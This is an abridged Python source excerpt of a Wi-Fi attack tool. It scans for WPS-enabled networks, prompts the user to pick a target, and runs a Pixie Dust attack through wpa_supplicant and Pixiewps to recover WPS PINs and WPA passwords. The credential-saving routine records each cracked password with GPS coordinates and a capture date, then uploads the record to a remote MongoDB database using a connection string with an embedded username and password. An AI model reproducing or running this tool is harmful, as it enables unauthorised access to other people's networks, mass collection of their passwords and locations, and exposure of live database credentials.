...
class Companion:
    ...
    def __init_wpa_supplicant(self):
        print(f'{prefix} Running wpa_supplicant…')
        ...
        while True:
            ...
            if ret is not None and ret != 0:
                raise ValueError(f'{prefix} wpa_supplicant returned an error: ' + self.wpas.communicate()[0])
...
#            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
            ...
            print(f'{prefix} Authenticating…')
        elif 'Authentication response' in line:
            print(f'{prefix} Authenticated')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print(f'{prefix} Associating with AP…')
        elif ('Associated with' in line) and (self.interface in line):
            bssid = line.split()[-1].upper()
            if self.connection_status.essid:
                print(f'{prefix} Associated with' + ' {} (ESSID: {})'.format(bssid, self.connection_status.essid))
            else:
                print(f'{prefix} Associated wif' + ' {}'.format(bssid))
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            print(f'{prefix} Sending EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            print(f'{prefix} Received Identity Request')
        elif 'using real identity' in line:
            print(f'{prefix} Sending Identity Response…')
    ...
    def __runPixiewps(self, showcmd=False, full_range=False):
        print(f"{prefix} Running Pixiewps…")
    ...
    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
        print(f"{prefix} WPS PIN: '{wps_pin}'")
        print(f"{prefix} WPA PSK: '{wpa_psk}'")
        print(f"{prefix} AP SSID: '{essid}'")
        f = open(f'saved/{essid}.json', 'w')
        lat = ""
        lon = ""
        try:
            gpsd.connect()
            ...
            print(f"{prefix} GEOLOCATION: '{packet.lat}, {packet.lon}'")
            lat = packet.lat
            lon = packet.lon
            nowtime = datetime.datetime.now()
        except ConnectionRefusedError:
            print(f"{prefix} Connection Refused [ Try to turn on GPS provider ] ")
        data = {"WPA PSK": f"{wpa_psk}", "WPS PIN": f"{wps_pin}", "CATCH DATE": f"{nowtime}", "GEOLOCATION": f"{lat}, {lon}"}
        f.write(f"{data}")
        f.close()
        with open("saved/essid.txt", "a") as g:
            g.write(f"\n{essid}")
            g.close()
        try:
            ...
            if d == 200:
                ...
                db = cluster["WiFix"]
                coll = db[f"{essid}"]
                print(f"{prefix} Wi-Fi saved in: {essid}.json")
                print(f"{prefix} Sending to database...")
                try:
                    cluster = MongoClient("mongodb+srv://Androme-data:MalekSulinek69@cluster0.cbybdts.mongodb.net/?retryWrites=true&w=majority")
                    coll.insert_one(data)
                    os.remove(f"saved/{essid}.json")
    ...
    def single_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
        ...
        if self.connection_status.status == 'GOT_PSK':
            ...
            if self.pixie_creds.got_all():
                ...
                print(f'{prefix} Not enough data to run Pixie Dust attack')
                return False
        else:
...
class WiFiScanner:
    ...
    def iw_scanner(self) -> Dict[int, dict]:
        ...
        matchers = {
            ...
            re.compile(r'(WPA):\t {prefix} Version: (\d+)'): handle_securityType,
        ...
        for n, network in network_list_items:
            number = f'{Fore.GREEN}{n}{Fore.RESET}|'
    ...
    def prompt_network(self) -> str:
        ...
        if not networks:
            print(f'{prefix} No WPS networks found.')
            time.sleep(1)
            return
        while 1:
            try:
                print('')
                networkNo = input(f'{prefix} Select target (press Enter to refresh): ')
        ...
        try:
            ...
            if args.pbc:
                ...
                if not args.bssid:
                    ...
                    if not args.loop:
                        print(f'{prefix} Scanning for available networks')
